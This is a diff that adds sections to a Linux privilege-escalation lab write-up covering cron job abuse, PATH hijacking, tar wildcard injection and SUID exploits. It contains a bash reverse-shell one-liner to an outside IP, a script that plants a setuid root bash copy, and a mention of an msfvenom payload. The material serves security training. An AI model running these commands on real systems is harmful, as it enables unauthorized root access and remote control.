@@ -373,11 +373,110 @@ various other sudo programs will also work, each time I get a root shell before 
 
 ## Cron Jobs - File Permissions
 
+Checking cron jobs with cat /etc/crontab I see that root is running two
+
+![image](https://user-images.githubusercontent.com/83407557/183709294-0a95b2ca-e420-44bd-9363-53e7e0f5c559.png)
+
+
+### overwrite.sh
+
+checking where it is and if I can write to it
+
+![image](https://user-images.githubusercontent.com/83407557/183709595-8a4c2bfe-73e7-4aa4-bd01-7b8bb2d66f57.png)
+
+
+Checking contents
+
+![image](https://user-images.githubusercontent.com/83407557/183709872-900798e2-f189-4cb4-bfbb-c733dd6f12a0.png)
+
+okay, so it write the date command output to a file called useless every 2 mins, but I can add my own bash revere-shell 1 liner `bash -i >& /dev/tcp/10.6.77.38/9001 0>&1` to the file with echo
+
+![image](https://user-images.githubusercontent.com/83407557/183710483-f0cf3148-f946-485e-a495-c30bc84b8ffc.png)
+
+then after a minute or so I get a callback
+
+![image](https://user-images.githubusercontent.com/83407557/183710591-6bba696d-fa3e-47ab-a9f3-16daaf243fc8.png)
+
+
 ## Cron Jobs - PATH Environment Variables
+
+Taking another look at the crontab I see that the first part of path is a directory I control (/home/user)
+
+![image](https://user-images.githubusercontent.com/83407557/183711056-b58d124d-1521-43d7-b3cf-f32f48b01b8b.png)
+
+This time instead of a rev shell I will just get a script to spawn a local root shell and naming it overwrite.sh. When the cronjob runs it will check for the program in my home directory first, therefore executing my script as root.
+
+malicious overwrite.sh saved to /home/user
+
+```bash
+#!/bin/bash
+
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+```
+
+After using chmod +x to make it executable it will run via cron
+
+waiting a minute for the cronjob to execute, after checking the file now exists I can spawn a root shell with `/tmp/rootbash -p`
+
+does it exist?
+
+![image](https://user-images.githubusercontent.com/83407557/183713914-aea5f5a3-813e-4a43-bafb-6b5051a0c025.png)
+
+executing
+
+![image](https://user-images.githubusercontent.com/83407557/183714001-357d2b87-71d6-4ae7-b2b7-37aa99381f01.png)
+
 
 ## Cron Jobs - Wildcards
 
+Looking at the contents of the other cron job being run as root I see a wildcare character "*"
+
+```bash
+rootbash-4.1# cat /usr/local/bin/compress.sh
+#!/bin/sh
+cd /home/user
+tar czf /tmp/backup.tar.gz *
+```
+Looking at the GTFObins for tar, you can see that command line arguments can be used to get a shell. 
+
+![image](https://user-images.githubusercontent.com/83407557/183714722-00d6ca97-ec72-42db-8305-3d95b559707a.png)
+
+Since the wildcard is used in the cronjob tar being run as root will try and tar all the files, however if I name files the same as the commands, I can point them at a malicious rev shell binary.
+
+First I need to make a milicous .elf file with msfvenom and transfer it over to the target
+
+![image](https://user-images.githubusercontent.com/83407557/183715871-e80c9028-e085-4eaa-b645-3629a41ccafc.png)
+
+Then I start a listener on kali, and add two files that will act as my arguments to the tar command
+
+![image](https://user-images.githubusercontent.com/83407557/183716379-d39c4314-ff93-4c29-93e1-e66271937692.png)
+
+After a minute, tar executes my elf as root and I get a callback
+
+![image](https://user-images.githubusercontent.com/83407557/183716709-e5171857-7fd6-47b6-bc68-3ed64a8fc7ac.png)
+
 ## SUID/SGID Executables - Know Exploits
+The CLI command in bash to find SUID/SGID executables
+
+`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
+
+![image](https://user-images.githubusercontent.com/83407557/183718330-891c6b35-bd28-4323-b485-c67bb8bf801b.png)
+ 
+Checking on of these executables in searchploit, shows that our exact version has an expliot
+
+![image](https://user-images.githubusercontent.com/83407557/183720861-e1378910-57b9-478f-aba0-82e5a6de0909.png)
+
+viewing and copying the exploit to my clipboard
+
+![image](https://user-images.githubusercontent.com/83407557/183721450-2a2c8804-cd2c-4717-a529-4f5cb819c0a1.png)
+
+creating on target and executing 
+
+![image](https://user-images.githubusercontent.com/83407557/183721712-247baac0-4524-4755-aec4-e5c6b81ad7fa.png)
+
+
+
 
 ## SUID/SGID Executables - Shared Object Injection
 
